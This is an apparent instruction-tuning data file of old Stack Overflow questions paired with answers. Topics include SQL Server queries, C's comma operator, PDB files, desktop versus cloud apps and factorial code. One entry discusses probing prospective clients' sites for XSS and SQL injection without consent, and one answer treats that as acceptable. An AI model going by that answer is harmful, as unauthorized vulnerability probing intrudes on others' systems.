{"instruction": "I've got the following rough structure:\nObject -> Object Revisions -> Data\n\nThe Data can be shared between several Objects.\nWhat I'm trying to do is clean out old Object Revisions. I want to keep the first, active, and a spread of revisions so that the last change for a time period is kept. The Data might be changed a lot over the course of 2 days then left alone for months, so I want to keep the last revision before the changes started and the end change of the new set.\nI'm currently using a cursor and temp table to hold the IDs and date between changes so I can select out the low hanging fruit to get rid of. This means using @LastID, @LastDate, updates and inserts to the temp table, etc... \nIs there an easier/better way to calculate the date difference between the current row and the next row in my initial result set without using a cursor and temp table? \nI'm on sql server 2000, but would be interested in any new features of 2005, 2008 that could help with this as well.", "output": "Here is example SQL.  If you have an Identity column, you can use this instead of \"ActivityDate\".\nSELECT DATEDIFF(HOUR, prev.ActivityDate, curr.ActivityDate)\n  FROM MyTable curr\n  JOIN MyTable prev\n    ON prev.ObjectID = curr.ObjectID\n  WHERE prev.ActivityDate =\n     (SELECT MAX(maxtbl.ActivityDate)\n        FROM MyTable maxtbl\n        WHERE maxtbl.ObjectID = curr.ObjectID\n          AND maxtbl.ActivityDate < curr.ActivityDate)\n\nI could remove \"prev\", but have it there assuming you need IDs from it for deleting."}
{"instruction": "So basically I am looking for good templates for writing both technical and functional specs on a project or work request.\nWhat do you use? How deep do you get while writing the specs? Any additional general tips you could provide would be appreciated.\nMy company needs these badly. I work for a contractor and right now we do not use these documents at all. \nEDIT: I have read Joel's take about Painless Specification, I really liked it, but are there any other opinions :)", "output": "On general tips;\nWe are implementing a process of \n1) Business Requirements Statement (BRS)\n2) Functional Specification\n3) Technical specification\nThe BRS covers what the business problems are, and what the requirements are around solutions, testing, security, reliability and delivery. This defines what would make a successful solution.\nThe functional spec details what is needed, how it should look, how long fields should be, etc.\nThe technical spec details where the data comes from, any tricky code that may need to be considered.\nThe customer owns the requirements. The developers own the tech specs, and the functional spec is a middle ground. Testing is done against the tech specs (usually unit testing) then against the functional specs (usually system testing) and then against the requirements (UAT).\nThe important part of this (and we are struggling with) is that the developers still need to deliver to the functional spec, and the original business requirements. In reality the functional and tech specs are just there for clarity.\nIn short, my main tip is to first work out the process you wish to implement. Then seek agreement from all parties involved in your proposed process, then work on the templates to fit. The templates themselves are only are a small part of the change you want to make."}
{"instruction": "I'm sure this has already been asked and answered so I apologize in advance for that but I'm not figuring out the correct keywords to search for.  Searching for \"Pattern\" hits way too many Q & A's to be useful.\nI'm working on a regression testing app.  I'm displaying a form on the screen and according to which user is logged in to the app some of the fields should be read-only.  So I can abstract a field object and I can abstract a user object but what pattern should I be looking at to describe the intersection of these two concepts?  In other words how should I describe that for Field 1 and User A, the field should be read-only?  It seems like read-only (or not) should be a property of the Field class but as I said, it depends on which user is looking at the form.  I've considered a simple two-dimensional array (e. g. ReadOnly[Field,User] = True) but I want to make sure I've picked the most effective structure to represent this.    \nAre there any software design patterns regarding this kind of data structure?  Am I overcomplicating things--would a two-dimensional array be the best way to go here?  As I said if this has been asked and answered, I do apologize.  I did search here and didn't find anything and a Google search failed to turn up anything either.", "output": "Table driven designs can be effective. \nSteve Maguire had few nice examples in Writing Solid Code .\nThey are also a great way to capture tests, see fit .\nIn your case something like:\nField1ReadonlyRules = {\n    'user class 1' : True,\n    'user class 2' : False\n}\n\nfield1.readOnly = Field1ReadonlyRules[ someUser.userClass ]\n\nAs an aside you probably want to model both users and user classes/roles/groups instead of combining them.\nA user typically captures who (authentication) while groups/roles capture what (permissions, capabilities)"}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "Flash, used well, allows easy localization and internationalization.\nFurthermore, it is much easier to use Flash in an accessible manner; you can feed screen readers the right text, instead of having them iterate over all of the possible form elements."}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "@org 0100h:\nfr-08: The Product isn't really all that visually pleasing to me, but I can certainly appreciate the fact the demo goes on for over 15 minutes of continuous scene rendering and non-looping soundtrack in a tiny package and the soundtrack is really good, IMHO.  And they did this 8 years ago.\nBtw, nice user id"}
{"instruction": "I've got the following rough structure:\nObject -> Object Revisions -> Data\n\nThe Data can be shared between several Objects.\nWhat I'm trying to do is clean out old Object Revisions. I want to keep the first, active, and a spread of revisions so that the last change for a time period is kept. The Data might be changed a lot over the course of 2 days then left alone for months, so I want to keep the last revision before the changes started and the end change of the new set.\nI'm currently using a cursor and temp table to hold the IDs and date between changes so I can select out the low hanging fruit to get rid of. This means using @LastID, @LastDate, updates and inserts to the temp table, etc... \nIs there an easier/better way to calculate the date difference between the current row and the next row in my initial result set without using a cursor and temp table? \nI'm on sql server 2000, but would be interested in any new features of 2005, 2008 that could help with this as well.", "output": "Hrmm, interesting challenge. I think you can do it without a self-join if you use the new-to-2005 pivot functionality."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "IDE's will probably be \"off the cloud\" for a long time, if ever... powerful customizable editors like Emacs will also probably stay \"off the cloud\" for a while."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "There's no reason that many corporations will move to an online system simply because of security concerns.  \nFor example, One of the greatest assets of Outlook is to go offline and continue working.  Sure Google Gears has similar functionality, but then you're trusting Google with your corporate security."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "Video editing and other resource intensive tasks will probably stay off the cloud for a long time."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "If I look at the application that we've selling and at the applications I've written as a consultant, I must very much agree with you. Most of them are useless if there is no internet connection. Some do work in disconnected mode, some don't, but all of them are pretty useless if you cannot connect to the big supporting system hidden far far away.\nOn the other hand, I wouldn't want to say that everything will move into the cloud in 5 years. Too much work with porting. There will be desktop applications that will function as a thin and offline-able client (just like, for example, Google Reader does if you install Gears) and there will be fully \"clouded\" :) applications.\nI have no idea what will happen in 10 years. If I put myself 10 years back (and that is very easy to do as I was writing a lot for a local computer magazine in that time), I totally couldn't predict how the computing will become internet-dependant in 2008."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "Such applications are dead since 15 years, ever since Sun took market leadership with their JavaStation.\nNo, wait. They did not. And things are not \"more and more\" moving to network-based applications. Sure, there is Webmail, but even GMail is FAR away from the comfort of modern Outlook or Thunderbird Clients. Same for office. Google Docs is a nice toy for ocasional use, but it's vastly inferior to conventional Office suites.\nThe Desktop is not dead and it will not die anytime soon. Internet Applications are alternatives in some situations, but be are just starting getting proper functionality and performance. Let's face it: JavaScript performance is still a Joke, the IDE Support is not there yet and Browsers are too unstable at the moment.\nGoogle Chrome, IE8 and Firefox 3.1 start to go in a better direction, but it will take years for them to be mature enough to create JavaScript applications that actually can fully replace desktop apps. But that would require some proper standardization accross browsers, and we all know that this will not happen before the next millennium or so."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "About 1% of users actually use Google Docs&Spreadsheets full-time. Almost all of the rest use Microsoft Office. So, no, off-the-cloud applications are not dead simply because a Google office suite exists. And those are, really, the only high-profile true web applications out there that are meant as desktop app replacements.\nWebmails are a special case though. It actually makes sense to use those rather than a desktop app, since your email is next-to-useless without a connection anyway. But most applications don't NEED a full-time Internet connection. A word processor certainly doesn't.\nWhat will definitely remain on the desktop:\n\nGames\nSmall apps (calculator, notepad type of stuff)\nAnything that generates data that needs to be secure (I don't imagine tons of people or companies want to trust their accounting details to Google, for example)\nWeb browsers (obviously)\nIDEs (Visual Studio via Ajax? Come on...)\nAuxiliary development tools (SVN, etc), since good security policy would forbid their use through a web browser\nAnything that needs high enough performance that network latency would be an impediment\n\nWhat will probably remain primarily on the desktop, at least for the next 5 years:\n\nOffice tools (unless web-based limitations can be lifted... which would require much better-performing web browsers than we have now)\nPhotoshop and such tools\nChat clients (web-based equivalents are disappointing so far)\n\nThat's not to say that any of the above cannot have an Internet-based component, of course."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "Gosh, I hope not as that's my job.  \nThe main piece of software I write controls electronic hardware (PXI boards and the like) for testing.  Without \"real\" hardware, there's nothing to test.  Even the very nature of the tests themselves prevent simultaneous access (once you set the state of a switch, you don't want someone else moving it).\nSo as long as you interact with any hardware, you're off-the-cloud.\nOh, and some companies have security issues with being on the Internet; I'd say security would also drive desktop apps with no connections."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "Well, the obvious examples would be graphics intensive games.\nNote that all that ajax-y applications aren't that \"lightweight\" to you computer as it looks/sounds like so, either. Compare Microsoft Office Words and Excel with Google Docs and Spreadsheets. With my average T7300 laptop, it takes 1-2 sec to load up the application while taking 7-10MB of the memory. Not possible with web browsers, especially when considering the way it's been heading to (trying to make web browsers rich client). IMHO, web apps can never match well-polished desktop apps in terms of usability and etc. Web apps are \"web\" apps, they are stuck in the square (the browser)."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "10 years or more ago this would have been, \"Are non-internet applications dead?\"\nThere's things the cloud does better than desktop applications, and in those places I'm sure non-cloud applications will become increasingly rare.  But there's plenty of applications where you might not want to use the cloud, the benefits don't outweigh the costs, or the complexity just isn't worth it.\nIt's a new tool, and it's a better tool than desktop applications for many things.  However, you don't throw away a hammer when you buy a screwdriver, you simply reserve it for when a nail needs to be driven."}
{"instruction": "What does the , operator do in C?", "output": "The expression:\n(expression1,  expression2)\n\nFirst expression1 is evaluated, then expression2 is evaluated, and the value of expression2 is returned for the whole expression."}
{"instruction": "What does the , operator do in C?", "output": "It causes the evaluation of multiple statements, but uses only the last one as a resulting value (rvalue, I think).\nSo...\nint f() { return 7; }\nint g() { return 8; }\n\nint x = (printf(\"assigning x\"), f(), g() );\n\nshould result in x being set to 8."}
{"instruction": "What does the , operator do in C?", "output": "As earlier answers have stated it evaluates all statements but uses the last one as the value of the expression. Personally I've only found it useful in loop expressions:\nfor (tmp=0, i = MAX; i > 0; i--)"}
{"instruction": "What does the , operator do in C?", "output": "The only place I've seen it being useful is when you write a funky loop where you want to do multiple things in one of the expressions (probably the init expression or loop expression. Something like:\nbool arraysAreMirrored(int a1[], int a2[], size_t size)\n{\n  size_t i1, i2;\n  for(i1 = 0, i2 = size - 1; i1 < size; i1++, i2--)\n  {\n    if(a1[i1] != a2[i2])\n    {\n      return false;\n    }\n  }\n\n  return true;\n}\n\nPardon me if there are any syntax errors or if I mixed in anything that's not strict C. I'm not arguing that the , operator is good form, but that's what you could use it for. In the case above I'd probably use a while loop instead so the multiple expressions on init and loop would be more obvious. (And I'd initialize i1 and i2 inline instead of declaring and then initializing.... blah blah blah.)"}
{"instruction": "I have to use a third-party component without source code. I have the release DLL and release PDB file. Let's call it 'CorporateComponent.dll'. My own code creates objects from this DLL and calls methods on these objects.\nCorpObject o = new CorpObject();\nInt32 result = o.DoSomethingLousy();\n\nWhile debugging, the method 'DoSomethingLousy' throws an exception. What does the PDB file do for me? If it does something nice, how can I be sure I'm making use of it?", "output": "The PDB is a database file that maps the instructions to their line numbers in the original code so when you get a stack trace you'll get the line numbers for the code. If it's an unmanaged DLL then the PDB file will also give you the names of the functions in the stack trace, whereas that information is usually only available for managed DLLs without PDBs."}
{"instruction": "I have to use a third-party component without source code. I have the release DLL and release PDB file. Let's call it 'CorporateComponent.dll'. My own code creates objects from this DLL and calls methods on these objects.\nCorpObject o = new CorpObject();\nInt32 result = o.DoSomethingLousy();\n\nWhile debugging, the method 'DoSomethingLousy' throws an exception. What does the PDB file do for me? If it does something nice, how can I be sure I'm making use of it?", "output": "The main I get from the pdb is line numbers and real method names for stack traces."}
{"instruction": "What does the , operator do in C?", "output": "I've seen used most in while loops:\nstring s;\nwhile(read_string(s), s.len() > 5)\n{\n   //do something\n}\n\nIt will do the operation, then do a test based on a side-effect. The other way would be to do it like this:\nstring s;\nread_string(s);\nwhile(s.len() > 5)\n{\n   //do something\n   read_string(s);\n}"}
{"instruction": "I have to use a third-party component without source code. I have the release DLL and release PDB file. Let's call it 'CorporateComponent.dll'. My own code creates objects from this DLL and calls methods on these objects.\nCorpObject o = new CorpObject();\nInt32 result = o.DoSomethingLousy();\n\nWhile debugging, the method 'DoSomethingLousy' throws an exception. What does the PDB file do for me? If it does something nice, how can I be sure I'm making use of it?", "output": "The pdb contains information the debugger needs in order to correctly read the stack.  Your stack traces will contain line numbers and symbol names of the stack frames inside of the modules for which you have the pdb.\nI'll give two usages examples.  The first is the obvious answer.  The second explains source-indexed pdb's.\n1st usage example...\nDepending on calling convention and which optimizations the compiler used, it might not be possible for the debugger to manually unwind the stack through a module for which you do not have a pdb.  This can happen with certain third party libraries and even for some parts of the OS.\nConsider a scenario in which you encounter an access violation inside of the windows OS.  The stack trace does not unwind into your own application because that OS component uses a special calling convention that confuses the debugger.  If you configure your symbol path to download the public OS pdb's, then there is a good chance that the stack trace will unwind into your application.  That enables you to see exactly what arguments your own code passed into the OS system call.  (and similar example for AV inside of a 3rd party library or even inside of your own code)\n2nd usage example...\nPdb's have another very useful property - they can integrate with some source control systems using a feature that microsoft calls \"source indexing\".  A source-indexed pdb contains source control commands that specify how to fetch from source control the exact file versions that were used to build the component.  Microsoft's debuggers understand how to execute the commands to automatically fetch the files during a debug session.  This is a powerful feature that saves the debug egineer from having to manually sync a source tree to the correct label for a given build.  It's especially useful for remote debugging sessions and for analyzing crash dumps post-mortem.\nThe \"debugging tools for windows\" installation (windbg) contains a document named srcsrv.doc which provides an example demonstrating how to use srctool.exe to determine which source files are source-indexed in a given pdb.\nTo answer your question \"how do I know\", the \"modules\" feature in the debugger can tell you which modules have a corresponding pdb.  In windbg use the \"lml\" command.  In visual studio select modules from somewhere in the debug menus.  (sorry, I don't have a current version of visual studio handy)"}
{"instruction": "I've got the following rough structure:\nObject -> Object Revisions -> Data\n\nThe Data can be shared between several Objects.\nWhat I'm trying to do is clean out old Object Revisions. I want to keep the first, active, and a spread of revisions so that the last change for a time period is kept. The Data might be changed a lot over the course of 2 days then left alone for months, so I want to keep the last revision before the changes started and the end change of the new set.\nI'm currently using a cursor and temp table to hold the IDs and date between changes so I can select out the low hanging fruit to get rid of. This means using @LastID, @LastDate, updates and inserts to the temp table, etc... \nIs there an easier/better way to calculate the date difference between the current row and the next row in my initial result set without using a cursor and temp table? \nI'm on sql server 2000, but would be interested in any new features of 2005, 2008 that could help with this as well.", "output": "Here's what I've got so far, I wanted to give this a little more time before accepting an answer.\nDECLARE @IDs TABLE \n(\n  ID int , \n  DateBetween int\n)\n\nDECLARE @OID int\nSET @OID = 6150\n\n-- Grab the revisions, calc the datediff, and insert into temp table var.\n\nINSERT @IDs\nSELECT ID, \n       DATEDIFF(dd, \n                (SELECT MAX(ActiveDate) \n                 FROM ObjectRevisionHistory \n                 WHERE ObjectID=@OID AND \n                       ActiveDate < ORH.ActiveDate), ActiveDate) \nFROM ObjectRevisionHistory ORH \nWHERE ObjectID=@OID\n\n\n-- Hard set DateBetween for special case revisions to always keep\n\n UPDATE @IDs SET DateBetween = 1000 WHERE ID=(SELECT MIN(ID) FROM @IDs)\n\n UPDATE @IDs SET DateBetween = 1000 WHERE ID=(SELECT MAX(ID) FROM @IDs)\n\n UPDATE @IDs SET DateBetween = 1000 \n WHERE ID=(SELECT ID \n           FROM ObjectRevisionHistory \n           WHERE ObjectID=@OID AND Active=1)\n\n\n-- Select out IDs for however I need them\n\n SELECT * FROM @IDs\n SELECT * FROM @IDs WHERE DateBetween < 2\n SELECT * FROM @IDs WHERE DateBetween > 2\n\nI'm looking to extend this so that I can keep at maximum so many revisions, and prune off the older ones while still keeping the first, last, and active. Should be easy enough through select top and order by clauses, um... and tossing in ActiveDate into the temp table.\nI got Peter's example to work, but took that and modified it into a subselect. I messed around with both and the sql trace shows the subselect doing less reads. But it does work and I'll vote him up when I get my rep high enough."}
{"instruction": "Although somewhat related to this question, I have what I think is a different take on it.\nIs a desktop app that has no connections to the \"cloud\" dead? I believe that some things are going to continue to be on the machine (operating systems obviously, browsers, some light-weight applications), but more and more things are moving to network-based applications (see Google Docs for office suites, GMail and other web-email clients for email, flickr for photo management, and more).\nSo other than the lightweight applications, is there anything that, in 5 to 10 years, will continue to be (either out of necessity or just demand) remain on the desktop and off the cloud?", "output": "I personally will never leave my stuff on the web under someone else's control.  All of my photos and e-mails I keep on local hard drives that I control.  \nI prefer to make my own stuff available to me through the web on my own hardware.  The only way to have reasonable performance and be productive when offline is to use local apps.  \nTo me the future will be local, but remotely accessible and synchronized.  At least for the next 20 years or so.\nNot only do I think it's not dead, I think it's the way everyone will want to go once we have a few disastrous failures (ie, websites disappearing with users content that isn't backed up anywhere or severe privacy breeches as some large company loses control of access to the data they are protecting)."}
{"instruction": "I would like to \"post-process\" my app.config file and perform some token replacements after the project builds.\nIs there an easy way to do this using a VS post-build event command?\n(Yeah I know I could probably use NAnt or something, looking for something simple.)", "output": "Take a look at XmlPreProcess. We use it for producing different config files for our testing and live deployment packages. \nWe execute it from a nant script as part of a continuous build but, since it's a console app, I see no reason why you coudn't add a call in your project's post-build event instead"}
{"instruction": "What tool(s) do you use to generate documentation for a database (preferably into a .chm help file)?", "output": "We use Redgate SQL Doc and we're very happy with the results. We've also had reasonably good results from Document! X from Innovasys (but we mainly use this for documenting COM interfaces)."}
{"instruction": "We have a lot of open discussions with potential clients, and they ask frequently about our level of technical expertise, including the scope of work for our current projects. The first thing I do in order to gauge the level of expertise on staff they have now or have previously used is to check for security vulnerabilities like XSS and SQL injection. I have yet to find a potential client who is vulnerable, but I started to wonder, would they actually think this investigation was helpful, or would they think, \"um, these guys will trash our site if we don't do business with them.\" Non-technical folks get scared pretty easily by this stuff, so I'm wondering is this a show of good faith, or a poor business practice?", "output": "I think the problem with this would be, that it would be quite hard to do checks on XSS without messing up their site.  Also, things like SQL injection could be quite dangerous. If you stuck with appending selects, you might not have too much of a problem, but then the question is, how do you know it's even executing the injected SQL?"}
{"instruction": "We have a lot of open discussions with potential clients, and they ask frequently about our level of technical expertise, including the scope of work for our current projects. The first thing I do in order to gauge the level of expertise on staff they have now or have previously used is to check for security vulnerabilities like XSS and SQL injection. I have yet to find a potential client who is vulnerable, but I started to wonder, would they actually think this investigation was helpful, or would they think, \"um, these guys will trash our site if we don't do business with them.\" Non-technical folks get scared pretty easily by this stuff, so I'm wondering is this a show of good faith, or a poor business practice?", "output": "I think this is a fairly subjective decision and different prospects would react differently if you told them.\nI think an idea might be to let them know after they have given business to someone else. \nAt least this way, the ex-prospect will not think that you are trying to pressure them into giving you the business."}
{"instruction": "We have a lot of open discussions with potential clients, and they ask frequently about our level of technical expertise, including the scope of work for our current projects. The first thing I do in order to gauge the level of expertise on staff they have now or have previously used is to check for security vulnerabilities like XSS and SQL injection. I have yet to find a potential client who is vulnerable, but I started to wonder, would they actually think this investigation was helpful, or would they think, \"um, these guys will trash our site if we don't do business with them.\" Non-technical folks get scared pretty easily by this stuff, so I'm wondering is this a show of good faith, or a poor business practice?", "output": "I would say that surprising people by suddenly penetration-testing their software may bother people if simply for the fact that they didn't know ahead of time. I would say if you're going to do this (and I believe it's a good thing to do), inform your clients ahead of time that you're going to do this. If they seem a little distraught by this, tell them the benefits of checking for human error from the attacker's point of view in a controlled environment. After all, even the most securely minded make mistakes: the Debian PRNG vulnerability is a good example of this."}
{"instruction": "Does Google Reader have an API and if so, how can I get the count of the number of unread posts for a specific user knowing their username and password?", "output": "It is there. Still in Beta though."}
{"instruction": "What's the best way to implement a SQL script that will grant select, references, insert, update, and delete permissions to a database role on all the user tables in a database?\nIdeally, this script could be run multiple times, as new tables were added to the database. SQL Server Management Studio generates scripts for individual database objects, but I'm looking for more of a \"fire-and-forget\" script.", "output": "There's an undocumented MS procedure called sp_MSforeachtable that you could use which is definitely in 2000 and 2005. \nTo grant select permissions the usage would be: \nEXECUTE sp_MSforeachtable @command1=' Grant Select on ? to RoleName'\n\nTo grant the other permissions either have a new statement for each one or just add them to the command like this: \nEXECUTE sp_MSforeachtable @command1=' Grant Select on ? to RoleName; Grant Delete on ? to RoleName;'\n\nWith a bit of playing around it might be possible to turn the role name into a parameter as well."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Python, C/C++ (weave): Multi-Language, Procedural\nFour implementations:\n\n[weave]\n[python]\n[psyco]\n[list]\n\nCode:\n#!/usr/bin/env python\n\"\"\" weave_factorial.py\n\n\"\"\"\n# [weave] factorial() as extension module in C++\nfrom scipy.weave import ext_tools\n\ndef build_factorial_ext():\n    func = ext_tools.ext_function(\n        'factorial', \n        r\"\"\"\n        unsigned long long i = 1;\n        for ( ; n > 1; --n)\n          i *= n;\n\n        PyObject *o = PyLong_FromUnsignedLongLong(i);\n        return_val = o;\n        Py_XDECREF(o); \n        \"\"\",  \n        ['n'], \n        {'n': 1}, # effective type declaration\n        {})\n    mod = ext_tools.ext_module('factorial_ext')\n    mod.add_function(func)\n    mod.compile()\n\ntry: from factorial_ext import factorial as factorial_weave\nexcept ImportError:\n    build_factorial_ext()\n    from factorial_ext import factorial as factorial_weave\n\n\n# [python] pure python procedural factorial()\ndef factorial_python(n):\n    i = 1\n    while n > 1:\n        i *= n\n        n -= 1\n    return i\n\n\n# [psyco] factorial() psyco-optimized\ntry:\n    import psyco\n    factorial_psyco = psyco.proxy(factorial_python)\nexcept ImportError:\n    pass\n\n\n# [list] list-lookup factorial()\nfactorials = map(factorial_python, range(21))   \nfactorial_list = lambda n: factorials[n]\n\n\nMeasure relative performance:\n$ python -mtimeit \\\n         -s \"from weave_factorial import factorial_$label as f\" \"f($n)\"\n\n\nn = 12\n\n[weave] 0.70 \u00b5sec (2)\n[python] 3.8 \u00b5sec (9)\n[psyco]  1.2 \u00b5sec (3)\n[list]  0.43 \u00b5sec (1)\n\nn = 20 \n\n[weave] 0.85 \u00b5sec (2)\n[python] 9.2 \u00b5sec (21)\n[psyco]  4.3 \u00b5sec (10)\n[list]  0.43 \u00b5sec (1)\n\n\n\u00b5sec stands for microseconds."}
{"instruction": "I'm writing a Telnet client of sorts in C# and part of what I have to parse are ANSI/VT100 escape sequences, specifically, just those used for colour and formatting (detailed here).\nOne method I have is one to find all the codes and remove them, so I can render the text without any formatting if needed:\n    \npublic static string StripStringFormating(string formattedString)\n{\n    if (rTest.IsMatch(formattedString))\n        return rTest.Replace(formattedString, string.Empty);\n    else\n        return formattedString;\n}\n\nI'm new to regular expressions and I was suggested to use this:\nstatic Regex rText = new Regex(@\"\\e\\[[\\d;]+m\", RegexOptions.Compiled);\nHowever, this failed if the escape code was incomplete due to an error on the server. So then this was suggested, but my friend warned it might be slower (this one also matches another condition (z) that I might come across later):\nstatic Regex rTest = \n              new Regex(@\"(\\e(\\[([\\d;]*[mz]?))?)?\", RegexOptions.Compiled);\nThis not only worked, but was in fact faster to and reduced the impact on my text rendering. Can someone explain to a regexp newbie, why? :)", "output": "Do you really want to do run the regexp twice? Without having checked (bad me) I would have thought that this would work well:\npublic static string StripStringFormating(string formattedString)\n{    \n    return rTest.Replace(formattedString, string.Empty);\n}\n\nIf it does, you should see it run ~twice as fast..."}
{"instruction": "What's the best way to programmatically merge a .reg file into the registry? This is for unit testing; the .reg file is a test artifact which will be added then removed at the start and end of testing.\nOr, if there's a better way to unit test against the registry...", "output": "One of the most frustrating things about writing unit tests is dealing with dependencies.  One of the greatest things about Test-Driven Development is that it produces code that is decoupled from its dependencies.  Cool, huh?\nWhen I find myself asking questions like this one, I look for ways to decouple the code I'm writing from the dependency.  Separate out the reading of the registry from the complexity that you'd like to test."}
{"instruction": "What's the best way to programmatically merge a .reg file into the registry? This is for unit testing; the .reg file is a test artifact which will be added then removed at the start and end of testing.\nOr, if there's a better way to unit test against the registry...", "output": "If you're shelling out, I'd use the reg command (details below). If you can tell us what language you're working with, we could provide language specific code.\nC:>reg /?\nREG Operation [Parameter List]\nOperation  [ QUERY   | ADD    | DELETE  | COPY    |\n               SAVE    | LOAD   | UNLOAD  | RESTORE |\n               COMPARE | EXPORT | IMPORT  | FLAGS ]\nReturn Code: (Except for REG COMPARE)\n0 - Successful\n  1 - Failed\nFor help on a specific operation type:\nREG ADD /?\n  REG DELETE /?\n[snipped]"}
{"instruction": "Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).\nHere's what I have today:\nstruct SomeData : IEquatable<SomeData>\n{\n    private readonly byte[] data;\n    public SomeData(byte[] data)\n    {\n        if (null == data || data.Length <= 0)\n        {\n            throw new ArgumentException(\"data\");\n        }\n        this.data = new byte[data.Length];\n        Array.Copy(data, this.data, data.Length);\n    }\n\n    public override bool Equals(object obj)\n    {\n        return obj is SomeData && Equals((SomeData)obj);\n    }\n\n    public bool Equals(SomeData other)\n    {\n        if (other.data.Length != data.Length)\n        {\n            return false;\n        }\n        for (int i = 0; i < data.Length; ++i)\n        {\n            if (data[i] != other.data[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    public override int GetHashCode()\n    {\n        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);\n    }\n}\n\nAny thoughts?\n\ndp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).\nfor example:\nbyte[] b1 = new byte[] { 1 